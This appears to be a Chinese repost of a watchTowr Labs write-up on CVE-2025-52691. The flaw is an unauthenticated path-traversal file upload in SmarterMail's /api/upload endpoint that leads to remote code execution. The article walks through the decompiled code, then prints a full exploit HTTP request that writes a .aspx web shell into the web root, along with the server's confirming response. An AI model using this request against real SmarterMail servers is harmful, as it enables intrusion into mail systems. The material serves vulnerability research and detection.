#  揭秘 SmarterMail 沉寂三个月后才公开的“满分”RCE 漏洞  
原创 骨哥说事  骨哥说事   2026-01-11 03:38  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/5136  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
欢迎来到2026！就在大家静待每年一月例行的SSL VPN利用潮如约而至时，watchTowr Labs研究团队在圣诞节后重拾“消停不下的双手与闲不住的大脑”。去年12月，研究团队注意到新加坡网络安全局（CSA）发布的一份关于SmarterTools SmarterMail解决方案的漏洞公告——CVE-2025-52691。这是一个**认证前远程代码执行**  
漏洞，在通用漏洞评分系统中获得了满分10分。  
  
这类漏洞总能成功吸引研究团队的注意力，因为将其置于“理想幻灭象限”来衡量时，它在两个坐标轴上都表现突出：既能引发足够的技术探讨兴趣，也常常成为安全圈的“流量密码”。  
  
那么，什么是**SmarterMail**  
？其开发商SmarterTools将其描述为“一款适用于Windows和Linux的安全、一体化商务邮件与协作服务器——一个经济高效的Microsoft Exchange替代方案”。  
# 疑云丛生：时间线上的巧合  
  
在研究团队准备进行技术分析时，一个奇怪的现象引起了他们的注意。  
  
CSA的漏洞公告和CVE条目都在2025年12月底发布。然而，通知中声称该漏洞已在 build 9413 中修复。但问题来了：**build 9413 的发布日期是2025年10月10日**  
。在研究团队撰写此报告时，最新版本已经是 build 9483 了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCocNDhGt6bmQKwAMfxdtzTcpg9bNQ6PHgEASlibz0nQKdlardo55PvgkQ/640?wx_fmt=png&from=appmsg "")  
  
虽然研究团队不会读心术，但这着实令人费解——这是否意味着，这个漏洞在官方披露前将近三个月就已经被悄悄地修复了？而那些使用此解决方案的客户，不得不等待大约两个半月，才得知这个 CVSS 10 分的并不算“关键”的漏洞已被发现并修复，并“建议他们紧急更新”？  
  
诚然，厂商可能会辩称：“这能让我们的客户更安全（免于使用先前不安全的软件），给他们留出补丁时间，等等”。出发点或许值得称赞，但经历了2025年乃至更久之前的种种教训，大家都被被迫明白了一个事实：攻击者同样具备逆向工程能力，他们完全有能力发掘出那些被悄无声息修补的漏洞。  
  
这不禁让人再次发问：这一切真的合理吗？是否存在一种可能，即有人在漏洞公告发布前就已发现了它，并在雷达之下悄然利用？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoicGlbsTobooHG1QRG6ChbJiczWq5kWU49UNr2oLsxOsOeD3gdHjGbKPw/640?wx_fmt=png&from=appmsg "")  
  
至少在 build 9413 的发布说明中，还友好地提及了一些“常规安全修复”，虽然语焉不详。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoPWn0yv5vkCJEOs3LSiceGyyrWgDicdicsfxh1CaYm21RdlfMiaGbHm07bw/640?wx_fmt=png&from=appmsg "")  
  
抱怨就此打住——让我们速览这个漏洞的技术细节。  
> 尽管该漏洞在事后看来相当“简单”，但其挖掘过程需要大量的代码阅读，并且似乎已在代码库中存在了相当长的时间。向来自新加坡CSIT的Chua Meng Han先生致意。  
  
# CVE-2025-52691 技术分析  
  
研究团队照例通过对比存在漏洞和已修复的版本来开始分析。  
  
根据漏洞公告，研究团队选取了以下SmarterMail版本：  
- 漏洞版本：Build 9406  
  
- 已修复版本：Build 9413  
  
跳过大量无关紧要的代码变更后，直接切入“有趣”的部分。  
  
下图展示了SmarterMail.Web.Api.FileUploadController.Upload  
方法的代码差异：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoFMVWh2icCJEdDYW1qhroSH2C798AjtozicwEXRMybhBWRnoMrkYX7DAA/640?wx_fmt=png&from=appmsg "")  
  
在上图的差异对比中，可以看到，已修复的 build 9413 版本中，对涉及GUID的参数**增加了验证逻辑**  
。  
  
这看起来很奇怪，并且与漏洞公告给人的感觉相符——研究团队验证一下这是否就是问题所在。  
  
FileUploadController  
是一个有效的API控制器，通过/api/upload  
路由注册：  
```
namespace SmarterMail.Web.Api{ [Route("api/upload")] [DisplayName("File Upload")] [ApiDoNotDocument] [ApiExceptionFilter]publicclassFileUploadController : ApiControllerBase {//... }}
```  
  
在修复后的版本中，这是一个有效的、**无需任何身份验证**  
即可访问的API端点（注意AuthenticatedService  
属性的AllowAnonymous = true  
设置）：  
```
  [ShortDescription("")]  [Description("Upload a file chunk.")]  [AuthenticatedService(AllowAnonymous = true)]  [Route("")]  [HttpPost]  [Returns(typeof(string))]  public Task<ActionResult> Upload()  {   //...  }
```  
  
感觉对了。  
  
当前拥有：  
- 一个无需认证的文件上传接口。  
  
- 在修复后，为该接口增加了GUID验证逻辑。  
  
无需占卜也能推测这里出了什么问题，以及GUID验证为何如此重要。  
  
让我们一步步来确认。  
> 此处代码量较大。为简明起见，已显著缩短代码片段，仅保留最关键部分。  
  
```
[ShortDescription("")][Description("Upload a file chunk.")][AuthenticatedService(AllowAnonymous = true)][Route("")][HttpPost][Returns(typeof(string))]public async Task<ActionResult> Upload(){ ActionResult actionResult;try {  StringValues stringValues = base.Request.Form["context"]; // [1]  StringValues stringValues2 = base.Request.Form["contextData"]; // [2]if (base.Request.Form.Files.Count == 0) // [3]  {   actionResult = this.StatusCode(415);  }else  {   //...    if (stringValues2 != StringValues.Empty)    {     pupData.targetData = JsonConvert.DeserializeObject<PostUploadProcessingTargetData>(stringValues2.ToString()); // [4]    }    //...    switch (readPartResult2.status)    {    case ReadPartStatus.BAD:     actionResult = base.CreateStatusCode(HttpStatusCode.InternalServerError, readPartResult2.message);     break;    case ReadPartStatus.GOOD:     actionResult = this.Ok("");     break;    case ReadPartStatus.DONE:    {     ResumableConfiguration uploadConfiguration = this.GetUploadConfiguration();     FileStream file = FileX.OpenRead(readPartResult2.filePath);     object obj = null;     SmarterMail.Web.Logic.UploadResult retStatus;     try     {      retStatus = await UploadLogic.ProcessCompletedUpload(this.WebHostEnvironment, base.HttpContext, base.HttpAbsoluteRootPath, base.VirtualAppPath, currentUserTemp, pupData, new SmarterMail.Web.Logic.UploadedFile      {       fileName = uploadConfiguration.FileName,       stream = file      });     }); // [5]//...
```  
  
解析代码中的关键点：  
- 在[1]  
和[2]  
处，代码从HTTP请求中获取context  
和contextData  
参数。  
  
- 在[3]  
处，获得一个重要信息：所有上传的文件应使用multipart/form-data  
内容类型。  
  
- 在[4]  
处，代码将contextData  
反序列化为PostUploadProcessingTargetData  
类型的对象。  
  
- 在[5]  
处，代码调用ProcessCompletedUpload  
方法，并将反序列化后的对象作为输入参数之一。  
  
在分析ProcessCompletedUpload  
方法之前，需要了解在contextData  
参数中应提供什么内容以确保JSON反序列化成功。  
  
以下是简化版的PostUploadProcessingTargetData  
类代码：  
```
namespace SmarterMail.Web.Logic{ [Serializable]publicclassPostUploadProcessingTargetData {//...  [CanBeNull]publicstring guid { get; set; }  [CanBeNull]publicstring domain { get; set; }//... }}
```  
  
简而言之，该类包含多个与上传相关的设置。由于它使用 JSON.NET 进行反序列化，需要在此处“提供”有效的JSON来控制这些设置。  
  
仔细查看后可以发现，PostUploadProcessingTargetData  
类包含一个公有属性guid  
，并具有公有的setter。这意味着可以在反序列化过程中控制此值，而这很可能与漏洞利用相关——因为修复补丁正是在此上下文中添加了验证。  
  
接下来，ProcessCompletedUpload  
方法执行了一项重要任务。  
  
该方法使用 switch-case 语句根据攻击者可控制的context  
参数值做出决策。  
  
本质上，它允许你执行不同的上传操作，例如：  
- 上传ICS文件  
  
- 上传附件  
  
- 导入笔记  
  
- 基于云端的上传  
  
- 等等  
  
研究团队怀疑guid  
参数是关键，因此重点研究了使用该参数的上传操作。  
```
public static async Task<UploadResult> ProcessCompletedUpload(IWebHostEnvironment webHostEnvironment, HttpContext httpContext, string httpAbsoluteRootPath, string virtualAppPath, UserData currentUser, PostUploadProcessing pupData, UploadedFile file){ UploadResult uploadResult;try {//...string target = pupData.target;if (target != null)  {   switch (target.Length)   {   case8:    if (target == "task-ics")    {     return UploadLogic.TaskImportIcsFile(currentUser, file, pupData.targetData.source, pupData.targetData.fileId);    }    break;   case10:    if (target == "attachment") // [1]    {     returnawait MailLogic.SaveAttachment(webHostEnvironment, httpAbsoluteRootPath, currentUser, file, pupData.targetData.guid, ""); // [2]    }    break;   case11:    if (target == "note-import")    {     return NoteLogic.ImportNote(currentUser, file, pupData.targetData.source);    }    break;    //...   //...}
```  
  
找到了！请看上面的注释[1]  
和[2]  
。  
  
如果攻击者在context  
参数中提供attachment  
值，代码将调用MailLogic.SaveAttachment  
方法，并以攻击者可控的guid  
值作为参数之一。  
  
最终，SmarterMail.Web.Logic.MailLogic.SaveAttachment  
方法会进一步调用由不同类提供的同名方法：SmarterMail.Web.Logic.HelperClasses.AttachmentsHelper.SaveAttachment  
。  
  
**魔法在此发生！**  
```
public static async Task<UploadResult> SaveAttachment(IWebHostEnvironment _webHostEnvironment, string httpAbsoluteRootPath, UserData currentUser, UploadedFile file, string guid, string contentId = ""){//...try {if (file != null && file.stream.Length > 0L)  {   sanitizedName = AttachmentsHelper.SanitizeFilename(file.fileName); // [1]   string text = AttachmentsHelper.FindExtension(sanitizedName); // [2]   DirectoryInfoX directoryInfoX = new DirectoryInfoX(PathX.Combine(FileManager.BaseDirectory, "App_Data", "Attachments")); // [3]   if (!DirectoryX.Exists(directoryInfoX.ToString()))   {    DirectoryX.CreateDirectory(directoryInfoX.ToString());   }   //...   lock (attachments)   {    List<AttachmentInfo> list;    AttachmentsHelper.Attachments.TryGetValue(attachguid, out list);    if (list != null)    {     if (list.FirstOrDefault((AttachmentInfo x) => x.Size == attachmentInfo.Size && x.ContentType == attachmentInfo.ContentType && x.ActualFileName == attachmentInfo.ActualFileName) == null)     {      attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, list.Count, text); // [4]      attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [5]      list.Add(attachmentInfo);     }    }    else    {     attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, 0, text); // [6]     attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [7]     //...    }   }   if (attachmentInfo.GeneratedFileName != null && attachmentInfo.GeneratedFileName.Length > 0)   {    using (FileStream fileStream = new FileStream(attachmentInfo.GeneratedFileNameAndLocation, FileMode.Create, FileAccess.Write))    {     file.stream.CopyTo(fileStream); // [8]    }    //...   }//...  }//... }//...}
```  
  
在深入分析前，先归纳一下已知信息：  
- 拥有一个无需认证的文件上传端点，通过发送HTTPmultipart/form-data  
请求来触发它。  
  
- 在此HTTP请求中，需要包含多个参数（例如context  
和contextData  
）。  
  
- contextData  
参数允许控制和指定guid  
参数的值，该值在上传附件  
操作中会被使用。  
  
- 至关重要的是，请求必须包含要上传的文件。  
  
- 为简洁起见，最后补充一点：在此HTTP请求中，还需要指定resumableFilename  
参数，该值用于设置file  
对象的fileName  
属性，正如在[1]  
处所见。  
  
如果仔细查看上面的代码片段，可能会发现一些潜在的障碍：  
- 在[1]  
处，代码尝试对攻击者控制的文件名进行清理。姑且假设此防护机制有效，不允许包含任何路径遍历序列。  
  
- 在[2]  
处，发现一个名为FindExtension  
的关键方法，它会在攻击者控制的文件名上调用。  
  
```
private static string FindExtension(string fileName)  {   if (fileName == null || fileName.Length < 1 || !fileName.Contains("."))   {    return "";   }   string[] array = fileName.Split('.', StringSplitOptions.None);   return array[array.Length - 1];  }
```  
  
然而，这个函数非常简单——它只提取文件的扩展名，不验证扩展名本身。这可能没问题，因为用户可能需要发送各种扩展名的附件。  
  
在[3]  
处，可以看到代码中生成上传操作基础目录的操作。  
  
在Windows环境中，该路径为：C:\\Program Files (x86)\\SmarterTools\\SmarterMail\\Service\\App_Data\\Attachments  
。  
  
App_Data  
作为一个上传目标目录相当特殊，因为IIS通常会严格限制对此目录的直接访问。  
  
总而言之，不能“简单地”上传一个Web Shell。如果这是正确的路径，需要设法**逃离这个上传目录**  
。  
  
幸运的是，还有更多线索——分别是第[4]  
、[5]  
行和第[6]  
、[7]  
行。  
  
AttachmentsHelper.GenerateFileName  
会生成一个文件名（其中包含感兴趣的guid  
参数），而GenerateFileNameAndLocation  
会将生成的文件名合并到完整的上传路径中！  
  
让我们深入看看：  
```
 private static string GenerateFileName(string attachguid, int count, string extension) {  if (extension != null && extension.Length > 0)  {   return string.Format("att_{0}_{1}.{2}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count, extension);  }  return string.Format("att_{0}_{1}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count); }
```  
  
惊喜不惊喜！或许该改行去算命了！  
  
似乎正确预测了guid  
参数就是关键突破口，并且它**极易受到路径遍历攻击**  
。  
  
等等，或许GenerateFileNameAndLocation  
方法中实现了一些保护措施？  
```
private static string GenerateFileNameAndLocation(string directory, string generatedFileName){ string format = "{0}" + PathVariables.FORWARDSLASH_STRING + "{1}"; return string.Format(format, directory, generatedFileName);}
```  
  
别想了，完全没有。  
  
在[8]  
处，可以看到，上传的文件最终将被写入——**包括路径遍历攻击**  
——由此在SmarterMail上实现了一个**完整的、无需认证的、可任意位置的文件写入**  
。  
  
# 漏洞利用实例  
  
将这些内容整合起来，触发上述攻击链的最终HTTP请求如下：  
```
POST /api/upload HTTP/1.1Host: watchtowr.com:1337Content-Length: 698Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="context"attachment------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="resumableIdentifier"watchTowrID------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="resumableFilename"fakefile.aspx------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="contextData"{"guid":"dag/../../../../../../../../../../../../../../../inetpub/wwwroot/watchTowr"}------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="whatever"; filename="whatever.jpg"Your-WebShell-Here------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
再次用文字解释一下：  
- 将context  
参数设置为attachment  
，以便进入存在漏洞的代码路径。  
  
- resumableFilename  
参数包含一个具有.aspx  
扩展名的文件名。  
  
- contextData  
参数值包含一个guid  
键，利用它来实施路径遍历攻击。  
  
- 文件上传部分包含Web Shell有效负载。  
  
为了加倍确认，可以调试GenerateFileNameAndLocation  
方法，并验证是否成功利用了路径遍历：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCormuVewT1P0rC5ZX7Qd610pOmDeLEibhv36dfRzibVFlQSn62h8vsRlTQ/640?wx_fmt=png&from=appmsg "")  
  
可能会注意到，代码会在文件名后附加一个整数，不过这并非大问题，因为**最终的文件名就包含在HTTP响应中**  
：  
```
{  "key": "att_dag/../../../../../../../../../../../../../../../inetpub/wwwroot/watchtowr_0.aspx",  "fileName": "fakefile.aspx"}
```  
  
最终，Web Shell成功上传，可以“享受”这个已悄悄修复三个月之久的RCE漏洞了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoz6IloibGvqOAWWNuYGQ8VOoibEExqPiczCpMIfrfBK1kNJe1iaumWrNHHQ/640?wx_fmt=png&from=appmsg "")  
  
另外，SmarterMail似乎会使用ClamAV  
扫描所有附件，如下方截图所示。  
  
然而，要么是ClamAV  
无法识别基本的Web Shell有效负载（有可能），要么是SmarterMail无法处理ClamAV  
的扫描结果。真有趣。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoFRBFdIWRhQtX1Sj3T3zmgOswIZ2RcRoSB02KdPpfia1aicnAN2S3Jb7w/640?wx_fmt=png&from=appmsg "")  
# 检测证据生成器  
  
秉承一贯风格，研究团队提供了**检测证据生成器**  
，以帮助组织评估其暴露风险并构建检测规则。你可在此仓库找到它。该生成器已针对以下环境验证：  
- 基于Windows的安装，结合  
  
- 新版构建（94xx）或旧版构建（16）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnc1YZP2vt5BBN5Rqb87zCoYGcN1wzicmGbuhEhFb2mSY7NP8oiagUGD93efJRibQEpvdLLg1upsAYgQ/640?wx_fmt=png&from=appmsg "")  
  
（不，研究团队并未测试SmarterMail的每一个历史版本）  
  
  
- END -  
  
**感谢阅读，如果觉得还不错的话，动动手指一键三连～**  
  
